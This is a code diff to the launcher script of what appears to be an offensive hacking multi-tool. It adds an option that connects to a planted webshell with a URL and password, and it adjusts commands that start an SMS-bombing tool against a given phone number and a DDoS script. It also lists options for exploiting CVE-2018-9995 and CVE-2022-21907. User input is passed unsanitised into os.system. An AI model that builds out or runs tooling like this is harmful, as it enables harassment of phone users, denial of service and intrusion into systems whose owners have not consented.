@@ -60,8 +60,10 @@ if __name__ == '__main__':
         parser.add_argument("-lh", "--lhost",type=str, help="local host,Add according to the other option instructions")
         parser.add_argument("-url", "--url",type=str, help="target web's url,Add according to the other option instructions")
         
+                
+        parser.add_argument("-ws", "--webshell",type=str, nargs="+",help="webshell url and passwd")      
         parser.add_argument("-SMB", "--SMBboom",type=str, help="SMBboom exploit number,could use with -agent")
-        parser.add_argument("-ddos", "--ddos",action='store_true', help="ddos exploit,don't need other option")
+        parser.add_argument("-ddos", "--ddos",action='store_true', help="ddos exploit,don't need other option,need python2 environment")
         parser.add_argument("-cve-2018-9995", "--cve2018_9995",action='store_true', help="cve-2018-9995 exploit,use with -rp and -rh")
         parser.add_argument("-cve-2022-21907", "--cve2022_21907",action='store_true', help="cve-cve-2022_21907 exploit,use with -rh or -url")
         
@@ -79,14 +81,23 @@ if __name__ == '__main__':
             modules.sniff.shodan_search(args.shodan)
         
         #EXP
+        if args.webshell:
+            import modules.webshell as w
+            t=0
+            for i in args.webshell:
+                if t==0:
+                   url=i
+                if t==1:
+                    passwd=i
+                t+=1
+            w.exp(url,passwd)                
         if args.SMBboom:
             import os
-            os.system("pipenv install")
             os.system("pipenv shell")
             if args.agent:
-                os.system("python modules/SMSBoom_master/smsboom.py -e -p "+args.SMBboom)
+                os.system("python modules/SMSBoom_master/smsboom.py run -e -p "+args.SMBboom)
             else:
-                os.system("python modules/SMSBoom_master/smsboom.py -p "+args.SMBboom)
+                os.system("python modules/SMSBoom_master/smsboom.py run -p "+args.SMBboom)
         if args.ddos==True:
             import os
             os.system("python2 modules/ddos.py")
